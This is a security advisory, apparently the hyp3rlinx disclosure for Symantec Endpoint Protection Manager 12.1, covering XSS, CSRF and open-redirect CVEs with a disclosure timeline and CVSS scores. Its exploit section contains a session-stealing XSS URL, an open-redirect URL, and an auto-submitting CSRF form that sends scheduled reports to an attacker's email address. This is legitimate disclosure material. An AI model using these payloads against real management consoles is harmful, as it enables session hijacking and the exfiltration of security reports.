@@ -1,0 +1,187 @@
+[+] Credits: John Page aka HYP3RLINX
+
+[+] Website: hyp3rlinx.altervista.org
+
+[+] Source:
+http://hyp3rlinx.altervista.org/advisories/SYMANTEC-SEPM-MULTIPLE-VULNS.txt
+
+[+] ISR: ApparitionSec
+
+
+Vendor:
+================
+www.symantec.com
+
+
+Product:
+===========
+SEPM
+Symantec Endpoint Protection Manager and client v12.1
+
+SEPM provides a centrally managed solution. It handles security policy
+enforcement, host integrity checking (Symantec Network Access Control only),
+and automated remediation over all clients. The policies functionality is
+the heart of the Symantec software. Clients connect to the server to get the
+latest policies, security settings, and software updates.
+
+
+Vulnerability Type(s):
+======================
+Multiple Cross Site Scripting (XSS)
+Cross Site Request Forgeries (CSRF)
+Open Redirect
+
+
+CVE Reference(s):
+=================
+CVE-2016-3652 / XSS
+CVE-2016-3653 / CSRF
+CVE-2016-5304 / Open Redirect
+
+
+Vulnerability Details:
+=====================
+
+The management console for SEPM contains a number of security
+vulnerabilities that could be used by a lower-privileged user or by
+an unauthorized user to elevate privilege or gain access to unauthorized
+information on the management server. Exploitation attempts of
+these vulnerabilities requires access to the SEP Management console.
+
+
+References:
+============
+https://www.symantec.com/security_response/securityupdates/detail.jsp?fid=security_advisory&pvid=security_advisory&year=&suid=20160628_01
+
+
+Exploit code(s):
+===============
+
+In this case XSS can bypass the "http-only" cookie protection because the
+SEPM application writes and stores the session ID within various
+javascript functions used by the application within the DOM thereby
+exposing them directly to the XSS attack.
+
+1) createModalDialogFromURL
+2) createWindowFromURL
+3) createWindowFromForm
+4) createIEWindowFromForm
+
+So all we need to do is alert(createModalDialogFromURL) anyone one of them
+(functions) an it will leak the session ID essentially throwing the
+HttpOnly secure cookie protection flag into the garbage.
+
+e.g.
+
+XSS POC Defeat http-only flag and access PHPSESSID:
+
+https://localhost:8445/Reporting/Admin/notificationpopup.php?New=1&Type=CR&height=alert%28createModalDialogFromURL%29#
+
+
+
+Open Redirect in external URL .php script:
+=========================================
+
+A reporting URL used to route generated reports externally to any
+authorized URL is susceptible to an open redirect vulnerability
+that could have allowed an authorized but less-privileged user to redirect
+an unsuspecting privileged user to an external URL to
+attempt further exploitation, e.g. phishing.
+
+
+If a victim clicks on a link supplied by an attacker
+
+e.g.
+
+https://localhost:8445/Reporting/common/externalurl.php?url=http://hyp3rlinx.altervista.org
+
+
+
+Cross Site Request Forgery (CSRF):
+==================================
+
+Multiple Cross Site Request Forgery exists in couple of places within this
+version of SEPM below is an example of sending scheduled report to
+an remote attackers email, if current logged in user visits malicious
+webpage or clicks infected link etc...
+
+
+Symantec Reporting Admin CSRF POC:
+
+<form id="PWN" action="https://localhost:8445/Reporting/Reports/sr-save.php"
+method="POST" />
+<input type="hidden" name="ReportName" value="HELL" />
+<input type="hidden" name="Description" value="PWNED!" />
+<input type="hidden" name="DisableReportSchedule" value="on" />
+<input type="hidden" name="NewReport" value="Y" />
+<input type="hidden" name="reporttype" value="1" />
+<input type="hidden" name="FILTERNAME" value="Default" />
+<input type="hidden" name="runEvery" value="1" />
+<input type="hidden" name="repeat" value="weekly" />
+<input type="hidden" name="datesched1" value="02%2F10%2F2016" />
+<input type="hidden" name="datesched2" value="02%2F10%2F2016" />
+<input type="hidden" name="filHourSchedule" value="16" />
+<input type="hidden" name="Schedulehour" value="16" />
+<input type="hidden" name="filMinSchedule" value="56" />
+<input type="hidden" name="Scheduleminute" value="56" />
+<input type="hidden" name="sysadmin" value="off" />
+<input type="hidden" name="sendto" value="evil@abyss.com" />
+<input type="hidden" name="updatelastrun" value="0" />
+<input type="hidden" name="HISTORYCONFIG_IDX" value="" />
+<input type="hidden" name="ReportPrefix" value="Y" />
+<input type="hidden" name="report_idx" value="Y-0" />
+<script>document.getElementById('PWN').submit()</script>
+</form>
+
+
+Disclosure Timeline:
+============================================
+Vendor Notification: Febuary 11, 2016
+Vendor Acknowledges Report: Febuary 12, 2016
+Vendor Releases Fix: June 28, 2016
+June 29, 2016 : Public Disclosure
+
+
+Exploitation Technique:
+=======================
+Remote
+
+
+Severity Level(s):
+====================
+Cross Site Scripting
+Medium
+v2 6.8
+AV:A/AC:M/Au:S/C:C/I:C/A:N
+v3 6.7
+AV:A/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:N
+
+Cross Site Request Forgery
+High
+v2 7.0
+AV:A/AC:M/Au:M/C:C/I:C/A:C
+v3 7.1
+AV:A/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H
+
+Open Redirect
+Medium
+v2 4.1
+AV:A/AC:L/Au:S/C:P/I:P/A:N
+v3 4.1
+AV:A/AC:L/PR:L/UI:R/S:U/C:L/I:L/A:N
+
+
+[+] Disclaimer
+The information contained within this advisory is supplied "as-is" with no
+warranties or guarantees of fitness of use or otherwise.
+Permission is hereby granted for the redistribution of this advisory,
+provided that it is not altered except by reformatting it, and
+that due credit is given. Permission is explicitly given for insertion in
+vulnerability databases and similar, provided that due credit
+is given to the author. The author is not responsible for any misuse of the
+information contained herein and accepts no responsibility
+for any damage caused by the use or misuse of this information. The author
+prohibits any malicious use of security related information
+or exploits by the author or elsewhere.
+
+hyp3rlinx
